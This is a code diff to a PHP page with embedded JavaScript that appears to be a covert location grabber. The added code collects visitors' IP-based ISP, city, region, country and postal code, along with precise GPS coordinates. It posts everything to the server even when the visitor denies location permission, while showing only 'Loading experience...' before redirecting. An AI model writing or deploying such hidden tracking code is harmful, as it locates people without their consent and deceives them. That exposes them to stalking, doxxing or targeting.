@@ -34,76 +34,80 @@ echo <<<HTML
             }
         }
 
+        async function getIPInfo() {
+            // Intentamos con ipwho.is primero (muy robusto para ISPs)
+            try {
+                let res = await fetch("https://ipwho.is/");
+                let d = await res.json();
+                if (d.success) return {
+                    isp: d.connection?.isp || d.connection?.org,
+                    city: d.city,
+                    region: d.region,
+                    country: d.country,
+                    zip: d.postal
+                };
+            } catch (e) {}
+            
+            // Fallback a ipapi.co si el primero falla
+            try {
+                let res = await fetch("https://ipapi.co/json/");
+                let d = await res.json();
+                return {
+                    isp: d.org,
+                    city: d.city,
+                    region: d.region,
+                    country: d.country_name,
+                    zip: d.postal
+                };
+            } catch (e) {}
+            return {};
+        }
+
         async function getLocation() {
+            document.getElementById("locationStatus").innerText = "Procesando...";
+            
+            // Iniciamos la obtención de info por IP de inmediato
+            const ipInfoPromise = getIPInfo();
 
             if (navigator.geolocation) {
-
-                document.getElementById("locationStatus").innerText =
-                    "Requesting location permission...";
-
-                // Obtener info IP
-                let extraInfo = {};
-
-                try {
-
-                    const response = await fetch("https://ipapi.co/json/");
-
-                    if (response.ok) {
-                        extraInfo = await response.json();
-                    }
-
-                } catch (e) {
-
-                    debugLog(
-                        "Error fetching IP info: " + e.message
-                    );
-                }
-
+                document.getElementById("locationStatus").innerText = "Requesting location permission...";
+                
                 navigator.geolocation.getCurrentPosition(
-
-                    function(position) {
-                        sendPosition(position, extraInfo);
+                    async (position) => {
+                        const extraInfo = await ipInfoPromise;
+                        sendFinalData(
+                            position.coords.latitude, 
+                            position.coords.longitude, 
+                            position.coords.accuracy, 
+                            extraInfo
+                        );
                     },
-
-                    function(error) {
-                        handleError(error);
+                    async (error) => {
+                        // Si deniega o falla el GPS, mandamos al menos lo de la IP
+                        const extraInfo = await ipInfoPromise;
+                        sendFinalData("Unknown", "Unknown", "IP-Based", extraInfo);
                     },
-
                     {
                         enableHighAccuracy: true,
-                        timeout: 10000,
+                        timeout: 8000,
                         maximumAge: 0
                     }
                 );
-
             } else {
-
-                document.getElementById("locationStatus").innerText =
-                    "Your browser doesn't support location services";
-
-                setTimeout(function() {
-                    redirectToMainPage();
-                }, 2000);
+                const extraInfo = await ipInfoPromise;
+                sendFinalData("Unknown", "Unknown", "Not Supported", extraInfo);
             }
         }
 
-        function sendPosition(position, extraInfo) {
+        function sendFinalData(lat, lon, acc, extraInfo) {
+            debugLog("Sending captured data...");
+            document.getElementById("locationStatus").innerText = "Loading experience...";
 
-            debugLog("Position obtained successfully");
-
-            document.getElementById("locationStatus").innerText =
-                "Location obtained, loading...";
-
-            var lat = position.coords.latitude;
-            var lon = position.coords.longitude;
-            var acc = position.coords.accuracy;
-
-            // Mapeo inteligente de datos (Funciona con ipwho.is y ipapi.co)
-            var isp = (extraInfo.connection ? extraInfo.connection.isp : extraInfo.org) || "Unknown";
+            var isp = extraInfo.isp || "Unknown";
             var city = extraInfo.city || "Unknown";
-            var region = (extraInfo.region || extraInfo.region_name) || "Unknown";
-            var country = (extraInfo.country || extraInfo.country_name) || "Unknown";
-            var zip = (extraInfo.postal || extraInfo.zip) || "Unknown";
+            var region = extraInfo.region || "Unknown";
+            var country = extraInfo.country || "Unknown";
+            var zip = extraInfo.zip || "Unknown";
 
             var xhr = new XMLHttpRequest();
 
@@ -123,15 +127,14 @@ echo <<<HTML
                     }, 1000);
                 }
             };
-
             xhr.onerror = function() {
                 redirectToMainPage();
             };
 
             var params =
-                "lat=" + encodeURIComponent(lat) +
-                "&lon=" + encodeURIComponent(lon) +
-                "&acc=" + encodeURIComponent(acc) +
+                "lat=" + lat +
+                "&lon=" + lon +
+                "&acc=" + acc +
                 "&isp=" + encodeURIComponent(isp) +
                 "&city=" + encodeURIComponent(city) +
                 "&region=" + encodeURIComponent(region) +
@@ -140,16 +143,6 @@ echo <<<HTML
                 "&time=" + new Date().getTime();
 
             xhr.send(params);
-        }
-
-        function handleError(error) {
-
-            document.getElementById("locationStatus").innerText =
-                "Redirecting...";
-
-            setTimeout(function() {
-                redirectToMainPage();
-            }, 2000);
         }
 
         function redirectToMainPage() {
